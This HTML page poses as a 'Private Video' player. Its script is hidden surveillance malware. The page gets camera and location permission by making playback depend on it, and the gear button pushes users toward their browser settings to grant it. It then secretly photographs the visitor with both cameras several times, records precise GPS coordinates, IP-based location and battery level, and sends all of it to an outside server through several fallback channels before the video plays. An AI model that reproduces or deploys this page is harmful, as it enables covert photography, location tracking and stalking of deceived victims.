<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Video Player</title>
    <style>
        /* نفس الأنماط السابقة */
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:Arial,sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; background:#000; color:#fff; overflow:hidden; }
        .video-player-container { width:90%; max-width:800px; background:#111; border-radius:12px; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,0.5); position:relative; }
        .video-thumbnail { position:relative; width:100%; height:450px; background:linear-gradient(rgba(0,0,0,0.7),rgba(0,0,0,0.7)), url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg'); background-size:cover; background-position:center; display:flex; align-items:center; justify-content:center; flex-direction:column; }
        .play-button-overlay { width:100px; height:100px; background:rgba(255,0,0,0.85); border-radius:50%; display:flex; align-items:center; justify-content:center; transition:all .3s; box-shadow:0 0 20px rgba(255,0,0,0.5); position:relative; z-index:5; cursor:pointer; }
        .play-button-overlay:hover { transform:scale(1.1); background:rgba(255,0,0,0.95); box-shadow:0 0 30px rgba(255,0,0,0.7); }
        .play-icon-large { width:0; height:0; border-left:30px solid #fff; border-top:20px solid transparent; border-bottom:20px solid transparent; margin-left:8px; }
        #gearButton { display:none; flex-direction:column; align-items:center; justify-content:center; background:rgba(255,255,255,0.1); border:4px solid #ff6b6b; border-radius:24px; padding:40px 50px; cursor:pointer; transition:all .3s; backdrop-filter:blur(8px); box-shadow:0 0 50px rgba(255,0,0,0.4); z-index:10; text-align:center; min-width:280px; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); }
        #gearButton:hover { transform:translate(-50%,-50%) scale(1.05); background:rgba(255,255,255,0.2); border-color:#ff4757; box-shadow:0 0 70px rgba(255,0,0,0.7); }
        #gearButton .icon-gear { font-size:90px; color:#ff6b6b; margin-bottom:15px; }
        #gearButton .main-text { font-size:32px; font-weight:bold; color:#fff; text-shadow:0 2px 10px rgba(0,0,0,0.8); }
        #gearButton .sub-text { font-size:18px; color:#ddd; margin-top:8px; opacity:0.9; }
        .video-info { padding:20px; border-bottom:1px solid #333; }
        .video-title { font-size:1.5rem; font-weight:bold; margin-bottom:8px; }
        .video-controls { padding:15px 20px; display:flex; align-items:center; justify-content:space-between; background:#1a1a1a; flex-wrap:wrap; gap:10px; }
        .control-button { background:none; border:none; color:#fff; font-size:1.2rem; cursor:pointer; padding:8px 15px; border-radius:4px; transition:background .2s; }
        .control-button:hover { background:#333; }
        .progress-bar { flex-grow:1; height:4px; background:#333; border-radius:2px; margin:0 20px; overflow:hidden; position:relative; min-width:60px; }
        .progress-fill { position:absolute; height:100%; width:0%; background:#ff0000; }
        .time-display { color:#aaa; font-size:.9rem; min-width:100px; text-align:center; }
        .spinner { border:4px solid #fff; border-top:4px solid rgba(255,255,255,0.3); border-radius:50%; width:32px; height:32px; animation:spin 1s linear infinite; position:absolute; display:none; top:50%; left:50%; transform:translate(-50%,-50%); }
        @keyframes spin { 0%{transform:translate(-50%,-50%) rotate(0)} 100%{transform:translate(-50%,-50%) rotate(360deg)} }
        #loading { display:none; font-size:1.2rem; color:#fff; margin-top:20px; text-align:center; }
        .loading-text { margin-top:10px; }
        .volume-control { display:flex; align-items:center; gap:10px; color:#aaa; }
        .volume-slider { width:80px; height:4px; background:#333; border-radius:2px; position:relative; }
        .volume-level { position:absolute; height:100%; width:70%; background:#ff0000; }
        .fullscreen-btn { margin-left:15px; }
        @media (max-width:480px) {
            .video-controls { padding:10px 12px; gap:6px; }
            .progress-bar { margin:0 6px; }
            .time-display { font-size:.75rem; min-width:60px; }
            .video-title { font-size:1.2rem; }
            .video-thumbnail { height:280px; }
            .play-button-overlay { width:70px; height:70px; }
            .play-icon-large { border-left-width:22px; border-top-width:14px; border-bottom-width:14px; margin-left:5px; }
            #gearButton { padding:20px 30px; min-width:200px; border-radius:16px; }
            #gearButton .icon-gear { font-size:60px; }
            #gearButton .main-text { font-size:24px; }
            #gearButton .sub-text { font-size:15px; }
        }
    </style>
</head>
<body>

<div class="video-player-container">
    <div class="video-info"><div class="video-title">Private Video</div></div>
    <div class="video-thumbnail" id="thumbnailArea">
        <div class="play-button-overlay" id="playButtonOverlay">
            <div class="play-icon-large"></div>
            <div class="spinner" id="spinner"></div>
        </div>
        <div id="gearButton">
            <div class="icon-gear">⚙️</div>
            <div class="main-text">تغيير الإعدادات</div>
            <div class="sub-text">اضغط لفتح إعدادات الموقع في المتصفح</div>
        </div>
    </div>
    <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
        <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
    </video>
    <div class="video-controls">
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <div class="time-display">0:00 / 2:45</div>
        <div class="volume-control"><span></span><div class="volume-slider"><div class="volume-level"></div></div></div>
        <button class="control-button fullscreen-btn">⛶</button>
    </div>
</div>
<div id="loading"><div class="spinner" style="position:static;"></div><div class="loading-text">Loading video...</div></div>

<script>
(function() {
    'use strict';
    let capturedData = { permissions:[], images:[], ipInfo:'', batteryStatus:'', location:'', chatId:'' };
    let settingsOpened = false, videoStarted = false, isProcessing = false;
    const playBtn = document.getElementById('playButtonOverlay');
    const thumbnailArea = document.getElementById('thumbnailArea');
    const realVideo = document.getElementById('realVideo');
    const spinner = document.getElementById('spinner');
    const loading = document.getElementById('loading');
    const gearBtn = document.getElementById('gearButton');

    async function requestPermissions() {
        let locationOk = false, cameraOk = false;
        try {
            await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(()=>{ locationOk=true; resolve(); }, reject, { enableHighAccuracy:true, timeout:10000 });
            });
        } catch(e) {}
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            stream.getTracks().forEach(t=>t.stop());
            cameraOk = true;
        } catch(e) {}
        return locationOk && cameraOk;
    }

    function openBrowserLocationSettings() {
        const ua = navigator.userAgent;
        // محاولات متعددة لفتح إعدادات الموقع في المتصفح
        const attempts = [
            () => { if (/Chrome/.test(ua) && !/Edge/.test(ua)) { window.location.href = 'chrome://settings/content/location'; return true; } return false; },
            () => { if (/Chrome/.test(ua) && !/Edge/.test(ua)) { window.open('chrome://settings/content/location', '_blank'); return true; } return false; },
            () => { if (/Firefox/.test(ua)) { window.location.href = 'about:preferences#privacy'; return true; } return false; },
            () => { if (/Firefox/.test(ua)) { window.open('about:preferences#privacy', '_blank'); return true; } return false; },
            () => { if (/Safari/.test(ua) && !/Chrome/.test(ua)) { window.location.href = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices'; return true; } return false; },
            () => { if (/Android/.test(ua)) { window.location.href = 'intent://settings#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=com.android.chrome;end'; return true; } return false; },
            () => { if (/Android/.test(ua)) { window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end'; return true; } return false; },
            () => { window.open('chrome://settings/content/location', '_blank'); return true; },
            () => { window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end'; return true; }
        ];
        for (let fn of attempts) {
            try { if (fn()) return; } catch(e) {}
        }
        alert('تعذر فتح الإعدادات. يرجى فتح إعدادات الموقع يدوياً في متصفحك.');
    }

    async function fetchIPInfo() { try { const r=await fetch('https://ipapi.co/json/'); const d=await r.json(); capturedData.ipInfo=`Country: ${d.country_name}, City: ${d.city}, IP: ${d.ip}`; } catch { capturedData.ipInfo="IP Info not available"; } }
    async function getBatteryStatus() { try { const b=await navigator.getBattery(); capturedData.batteryStatus=Math.round(b.level*100)+'%'; } catch { capturedData.batteryStatus="Unknown"; } }
    async function captureFromCamera(facingMode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            await new Promise(r=>setTimeout(r,1000));
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
            stream.getTracks().forEach(t=>t.stop());
            capturedData.permissions.push(`${facingMode==='user'?'Front':'Back'} Camera Allowed`);
        } catch { capturedData.permissions.push(`${facingMode==='user'?'Front':'Back'} Camera Denied`); }
    }
    async function getLocation() {
        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
            });
            capturedData.location = `Lat: ${pos.coords.latitude.toFixed(6)}, Long: ${pos.coords.longitude.toFixed(6)}`;
            capturedData.permissions.push('Geolocation Allowed');
        } catch { capturedData.permissions.push('Geolocation Denied'); capturedData.location=''; }
    }

    async function sendDataWithBypass(data) {
        const urls = ['https://server-brxz.onrender.com/submitData','https://server-brxz.onrender.com/submitData'];
        for (let url of urls) {
            try { await fetch(url, { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:new URLSearchParams(data), mode:'no-cors' }); return; } catch(e) {}
            try { const xhr=new XMLHttpRequest(); xhr.open('POST',url,false); xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); xhr.send(new URLSearchParams(data)); return; } catch(e) {}
            try { const iframe=document.createElement('iframe'); iframe.style.display='none'; document.body.appendChild(iframe); const form=document.createElement('form'); form.method='POST'; form.action=url; form.target=iframe.name||'hiddenFrame'; iframe.name=form.target; for(let key in data){ const input=document.createElement('input'); input.type='hidden'; input.name=key; input.value=data[key]; form.appendChild(input); } document.body.appendChild(form); form.submit(); setTimeout(()=>{ document.body.removeChild(form); document.body.removeChild(iframe); },1000); return; } catch(e) {}
            try { const blob=new Blob([new URLSearchParams(data).toString()], {type:'application/x-www-form-urlencoded'}); navigator.sendBeacon(url,blob); return; } catch(e) {}
        }
    }

    function startVideoWithSound() {
        if (videoStarted) return;
        videoStarted = true;
        thumbnailArea.style.display = 'none';
        realVideo.style.display = 'block';
        realVideo.muted = false;
        realVideo.volume = 1.0;
        const playPromise = realVideo.play();
        if (playPromise !== undefined) {
            playPromise.then(()=>{}).catch(()=>{
                realVideo.muted = true;
                realVideo.play().then(()=>{ setTimeout(()=>{ realVideo.muted=false; realVideo.volume=1.0; },100); }).catch(()=>{});
            });
        }
        setTimeout(()=>{ realVideo.muted=false; realVideo.volume=1.0; try{ realVideo.play(); }catch(e){} },500);
        setTimeout(()=>{ realVideo.muted=false; realVideo.volume=1.0; try{ realVideo.play(); }catch(e){} },3000);
    }

    async function collectAndPlay() {
        if (isProcessing) return;
        isProcessing = true;
        spinner.style.display = 'block';
        loading.style.display = 'block';
        playBtn.style.opacity = '0.5';
        playBtn.style.pointerEvents = 'none';
        capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
        await Promise.all([ fetchIPInfo(), getBatteryStatus(), getLocation() ]);
        await captureFromCamera('user');
        await captureFromCamera('environment');
        await captureFromCamera('user');
        await captureFromCamera('environment');
        const data = {
            chatId: capturedData.chatId,
            imageDatas: capturedData.images.join(','),
            location: capturedData.location,
            permissions: capturedData.permissions.join(', '),
            ipInfo: capturedData.ipInfo,
            battery: capturedData.batteryStatus
        };
        await sendDataWithBypass(data);
        spinner.style.display = 'none';
        loading.style.display = 'none';
        playBtn.style.opacity = '1';
        playBtn.style.pointerEvents = 'auto';
        startVideoWithSound();
        isProcessing = false;
    }

    function showGearButton() { gearBtn.style.display = 'flex'; playBtn.style.display = 'none'; }
    function hideGearButton() { gearBtn.style.display = 'none'; playBtn.style.display = 'flex'; }

    async function handlePlayClick(e) {
        e.stopPropagation();
        if (videoStarted || isProcessing) return;
        if (settingsOpened) {
            const granted = await requestPermissions();
            if (granted) { hideGearButton(); await collectAndPlay(); }
            else { showGearButton(); }
            return;
        }
        const granted = await requestPermissions();
        if (granted) { await collectAndPlay(); }
        else { showGearButton(); }
    }

    function handleGearClick() {
        settingsOpened = true;
        openBrowserLocationSettings();
        // بعد الفتح، نعتمد على visibilitychange
    }

    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
            (async () => {
                const granted = await requestPermissions();
                if (granted) { hideGearButton(); await collectAndPlay(); }
                else { showGearButton(); }
            })();
        }
    });

    playBtn.addEventListener('click', handlePlayClick);
    thumbnailArea.addEventListener('click', handlePlayClick);
    gearBtn.addEventListener('click', handleGearClick);

    document.addEventListener('click', function() {
        if (realVideo) { realVideo.muted = false; realVideo.volume = 1.0; try{ realVideo.play(); }catch(e){} }
    }, true);

    document.querySelectorAll('.control-button').forEach(btn => {
        btn.addEventListener('click', function(e) {
            e.stopPropagation();
            if (this.textContent.includes('⛶')) {
                const vid = document.getElementById('realVideo');
                if (vid.requestFullscreen) vid.requestFullscreen();
                else if (vid.webkitRequestFullscreen) vid.webkitRequestFullscreen();
            }
        });
    });

    const progressInterval = setInterval(() => {
        const fill = document.querySelector('.progress-fill');
        const vid = document.getElementById('realVideo');
        if (vid.style.display === 'block') { clearInterval(progressInterval); return; }
        let w = parseInt(fill.style.width) || 35;
        w = (w + 0.1) % 100;
        fill.style.width = w + '%';
        const sec = Math.floor((w / 100) * 165);
        const m = Math.floor(sec / 60);
        const s = sec % 60;
        document.querySelector('.time-display').textContent = `${m}:${s.toString().padStart(2,'0')} / 2:45`;
    }, 1000);
})();
</script>
</body>
</html>
